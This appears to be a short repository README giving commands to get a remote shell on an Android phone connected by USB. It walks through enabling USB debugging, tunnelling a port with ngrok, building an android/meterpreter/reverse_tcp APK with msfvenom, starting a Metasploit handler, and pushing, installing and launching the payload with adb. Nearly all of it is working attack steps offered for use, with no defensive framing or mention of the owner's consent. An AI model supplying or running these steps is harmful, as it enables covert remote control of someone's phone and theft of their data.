# adb-phone-shell
How to get phone shell with msfvenom using USB connection with adb shell

# Getting shell
// First you gotta connect the phone with USB and then in developer options enable the USB-Debugging. You can access to developer options by pressing the version number of your phone 7 times.
adb devices
adb shell

# Opening listener port and creating the payload

ngrok tcp 1234
msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1234 -o payload.apk

# Checking on multi handler

use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 127.0.0.1; set LPORT 1234; exploit

# Pusing payload to the phone and downloading

adb push payload.apk /sdcard/
adb install payload.apk
adb shell am start -n com.metasploit.stage/com.metasploit.stage.MainActivity

